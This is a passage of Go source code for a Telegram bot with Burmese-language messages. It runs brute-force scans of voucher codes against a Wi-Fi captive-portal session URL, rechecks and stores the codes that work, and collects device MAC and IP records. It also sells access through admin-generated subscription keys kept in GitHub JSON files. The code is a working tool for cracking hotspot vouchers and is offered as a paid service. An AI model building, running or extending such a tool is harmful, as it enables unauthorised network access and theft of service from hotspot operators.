					Text:   "Scan ရပ်ထားပါသည်။ /resume ဖြင့် ပြန်စနိုင်ပါသည်။",
				})
			} else {
				mu.Unlock()
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: cid},
					Text:   "ရပ်ရန် scan မရှိပါ။",
				})
			}
		case "/resume":
			cid := chatID
			if _, hasSess := userData[cid]; !hasSess || userData[cid].SessionURL == "" {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: cid},
					Text:   "/setup လုပ်ပါ။",
				})
				return
			}
			pm, _ := botr.SendMessage(&telego.SendMessageParams{
				ChatID: telego.ChatID{ID: cid},
				Text:   "Preparing...",
			})
			mu.Lock()
			scanTasks[cid] = &ScanTask{Stop: false, ScanID: fmt.Sprintf("%d", time.Now().UnixNano())}
			delete(successMessages, cid)
			delete(limitedMessages, cid)
			mu.Unlock()
			go runBruteForce("6", cid, userData[cid].SessionURL, 0, 0, *pm)
			botr.SendMessage(&telego.SendMessageParams{
				ChatID: telego.ChatID{ID: cid},
				Text:   "ယခင် scan ပြန်စပါပြီ။",
			})
		case "/saved":
			cid := chatID
			mu.RLock()
			s := successTexts[cid]
			l := limitedTexts[cid]
			mu.RUnlock()
			if len(s) == 0 && len(l) == 0 {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: cid},
					Text:   "ရှာတွေ့ထားသော code မရှိသေးပါ။",
				})
				return
			}
			var sb strings.Builder
			if len(s) > 0 {
				sb.WriteString(fmt.Sprintf("✅ Success Codes (%d):\n", len(s)))
				for _, e := range s {
					parts := strings.SplitN(e, " | ", 2)
					if len(parts) == 2 {
						sb.WriteString(fmt.Sprintf("<code>%s</code> | %s\n", parts[0], parts[1]))
					} else {
						sb.WriteString(fmt.Sprintf("<code>%s</code>\n", e))
					}
				}
			}
			if len(l) > 0 {
				sb.WriteString(fmt.Sprintf("\n⚠️ Limited Codes (%d):\n<code>%s</code>", len(l), strings.Join(l, "\n")))
			}
			botr.SendMessage(&telego.SendMessageParams{
				ChatID:    telego.ChatID{ID: cid},
				Text:      sb.String(),
				ParseMode: "HTML",
			})
		case "/notify":
			cid := chatID
			mu.Lock()
			notifySetting[cid] = !notifySetting[cid]
			st := "OFF"
			if notifySetting[cid] {
				st = "ON"
			}
			mu.Unlock()
			botr.SendMessage(&telego.SendMessageParams{
				ChatID: telego.ChatID{ID: cid},
				Text:   "Notify: " + st,
			})
		case "/recheck":
			cid := chatID
			mu.RLock()
			app := approve[cid]
			ud, hasU := userData[cid]
			succ := successTexts[cid]
			mu.RUnlock()
			if !app {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: cid},
					Text:   "/key အတည်ပြုပါ။",
				})
				return
			}
			if !hasU || ud.SessionURL == "" {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: cid},
					Text:   "/setup လုပ်ပါ။",
				})
				return
			}
			if len(succ) == 0 {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: cid},
					Text:   "Recheck လုပ်ရန် code မရှိပါ။",
				})
				return
			}
			botr.SendMessage(&telego.SendMessageParams{
				ChatID: telego.ChatID{ID: cid},
				Text:   "Recheck လုပ်နေပါသည်...",
			})
			var ns []string
			for _, e := range succ {
				code := strings.SplitN(e, " | ", 2)[0]
				bs, _, _ := checkVoucher(ud.SessionURL, code, cid)
				if strings.Contains(bs, "logonUrl") {
					ns = append(ns, e)
				}
			}
			mu.Lock()
			successTexts[cid] = ns
			mu.Unlock()
			if len(ns) > 0 {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID:    telego.ChatID{ID: cid},
					Text:      fmt.Sprintf("✅ Rechecked:\n<code>%s</code>", strings.Join(ns, "\n")),
					ParseMode: "HTML",
				})
			} else {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: cid},
					Text:   "Success code တစ်ခုမှ မကျန်ပါ။",
				})
			}
		case "/result":
			uid := fmt.Sprintf("%d", chatID)
			data, _, _ := getFileContent("result.json")
			if codes, ok := data[uid].([]interface{}); ok && len(codes) > 0 {
				var cl []string
				for _, c := range codes {
					cl = append(cl, fmt.Sprintf("%v", c))
				}
				botr.SendMessage(&telego.SendMessageParams{
					ChatID:    telego.ChatID{ID: chatID},
					Text:      fmt.Sprintf("✅ GitHub:\n<code>%s</code>", strings.Join(cl, "\n")),
					ParseMode: "HTML",
				})
			} else {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "သင့်တွင် code မရှိသေးပါ။",
				})
			}
		case "/status":
			if fmt.Sprintf("%d", chatID) != ADMIN_ID {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "No Permission",
				})
				return
			}
			mu.RLock()
			act := 0
			for _, t := range scanTasks {
				if !t.Stop {
					act++
				}
			}
			apv := 0
			for _, v := range approve {
				if v {
					apv++
				}
			}
			mu.RUnlock()
			uptime := time.Since(startTime)
			botr.SendMessage(&telego.SendMessageParams{
				ChatID: telego.ChatID{ID: chatID},
				Text: fmt.Sprintf("📊 Status\n⏱ %dh%dm%ds\n🔍 Active: %d\n✅ Users: %d",
					int(uptime.Hours()), int(uptime.Minutes())%60, int(uptime.Seconds())%60, act, apv),
			})
		case "/genkey":
			if fmt.Sprintf("%d", chatID) != ADMIN_ID {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "No Permission",
				})
				return
			}
			args := strings.Fields(msg.Text)
			if len(args) < 3 {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "/genkey <duration> <user_id>",
				})
				return
			}
			exp := generateExpiry(args[1])
			if exp == "" {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "Duration မမှန်ပါ။",
				})
				return
			}
			data, sha, _ := getFileContent("auth_list.json")
			data[args[2]] = map[string]interface{}{"expires_at": exp, "plan": args[1]}
			updateFileContent("auth_list.json", data, sha, "Add key")
			botr.SendMessage(&telego.SendMessageParams{
				ChatID: telego.ChatID{ID: chatID},
				Text:   fmt.Sprintf("✅ Key Generated\nUSER: %s\nPLAN: %s", args[2], args[1]),
			})
		case "/delkey":
			if fmt.Sprintf("%d", chatID) != ADMIN_ID {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "No Permission",
				})
				return
			}
			args := strings.Fields(msg.Text)
			if len(args) < 2 {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "/delkey <user_id>",
				})
				return
			}
			data, sha, _ := getFileContent("auth_list.json")
			if _, ok := data[args[1]]; !ok {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "User မတွေ့ပါ။",
				})
				return
			}
			delete(data, args[1])
			updateFileContent("auth_list.json", data, sha, "Delete key")
			var cid int64
			fmt.Sscanf(args[1], "%d", &cid)
			mu.Lock()
			delete(approve, cid)
			delete(userData, cid)
			mu.Unlock()
			botr.SendMessage(&telego.SendMessageParams{
				ChatID: telego.ChatID{ID: chatID},
				Text:   "✅ Key Deleted",
			})
		case "/listkeys":
			if fmt.Sprintf("%d", chatID) != ADMIN_ID {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "No Permission",
				})
				return
			}
			data, _, _ := getFileContent("auth_list.json")
			if len(data) == 0 {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "Key မရှိသေးပါ။",
				})
				return
			}
			var ls []string
			for u, v := range data {
				m, _ := v.(map[string]interface{})
				ls = append(ls, fmt.Sprintf("👤 %s | Plan: %s", u, m["plan"]))
			}
			botr.SendMessage(&telego.SendMessageParams{
				ChatID: telego.ChatID{ID: chatID},
				Text:   strings.Join(ls, "\n"),
			})
		case "/stalist":
			if fmt.Sprintf("%d", chatID) != ADMIN_ID {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "No Permission",
				})
				return
			}
			args := strings.Fields(msg.Text)
			data, _, _ := getFileContent("sta_info.json")
			if len(data) == 0 {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "STA info မရှိသေးပါ။",
				})
				return
			}
			if len(args) >= 2 {
				if info, ok := data[args[1]]; ok {
					m := info.(map[string]interface{})
					botr.SendMessage(&telego.SendMessageParams{
						ChatID: telego.ChatID{ID: chatID},
						Text:   fmt.Sprintf("📋 %s\nMAC: %s\nIP: %s", args[1], m["mac"], m["ip"]),
					})
				} else {
					botr.SendMessage(&telego.SendMessageParams{
						ChatID: telego.ChatID{ID: chatID},
						Text:   "မတွေ့ပါ။",
					})
				}
			} else {
				var ls []string
				for c, v := range data {
					m := v.(map[string]interface{})
					ls = append(ls, fmt.Sprintf("%s (MAC: %s, IP: %s)", c, m["mac"], m["ip"]))
				}
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   strings.Join(ls, "\n"),
				})
			}
		case "/delsta":
			if fmt.Sprintf("%d", chatID) != ADMIN_ID {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "No Permission",
				})
				return
			}
			args := strings.Fields(msg.Text)
			if len(args) < 2 {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "/delsta <code>",
				})
				return
			}
			data, sha, _ := getFileContent("sta_info.json")
			if _, ok := data[args[1]]; !ok {
				botr.SendMessage(&telego.SendMessageParams{
					ChatID: telego.ChatID{ID: chatID},
					Text:   "မတွေ့ပါ။",
				})
				return
			}
			delete(data, args[1])
			updateFileContent("sta_info.json", data, sha, "Delete STA")
			botr.SendMessage(&telego.SendMessageParams{
				ChatID: telego.ChatID{ID: chatID},
				Text:   "✅ Deleted",
			})
		}
	})
}

// ==================== MAIN ====================
func main() {
	BOT_TOKEN = os.Getenv("BOT_TOKEN")
	GITHUB_TOKEN = os.Getenv("GITHUB_TOKEN")
	REPO_OWNER = os.Getenv("REPO_OWNER")
	REPO_NAME = os.Getenv("REPO_NAME")
	if v := os.Getenv("ADMIN_ID"); v != "" {
		ADMIN_ID = v
	}
	if v := os.Getenv("CONCURRENCY"); v != "" {
		fmt.Sscanf(v, "%d", &CONCURRENCY)
	}
	if v := os.Getenv("WEB_PORT"); v != "" {
		WEB_PORT = v
	}
	if v := os.Getenv("OCR_SERVER"); v != "" {
		OCR_SERVER = v
	}

	if BOT_TOKEN == "" {
		log.Fatal("BOT_TOKEN env is required")
	}

	go func() {
		http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			w.Write([]byte("Bot is awake and running 24/7!"))
		})
		log.Printf("Web server started on port %s", WEB_PORT)
		if err := http.ListenAndServe(":"+WEB_PORT, nil); err != nil {
			log.Printf("Web server error: %v", err)
		}
	}()

	go successUpdater()
	go staUpdater()

	var b *telego.Bot
	var err error
	for i := 0; i < 5; i++ {
		b, err = telego.NewBot(BOT_TOKEN, telego.WithDefaultDebugLogger())
		if err == nil {
			break
		}
		log.Printf("Failed to create bot (attempt %d/5): %v", i+1, err)
		time.Sleep(5 * time.Second)
	}
	if err != nil {
		log.Fatal("Failed to create bot after 5 attempts:", err)
	}

	registerHandlers(b)

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	log.Println("🤖 Bot started! Running 24/7...")

	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				log.Println("Starting polling...")
				if err := b.StartPolling(ctx, &telego.PollingConfig{Timeout: 20}); err != nil {
					log.Printf("Polling error: %v. Restarting in 5s...", err)
					time.Sleep(5 * time.Second)
				}
			}
		}
	}()

	<-ctx.Done()
	log.Println("Shutting down bot...")
}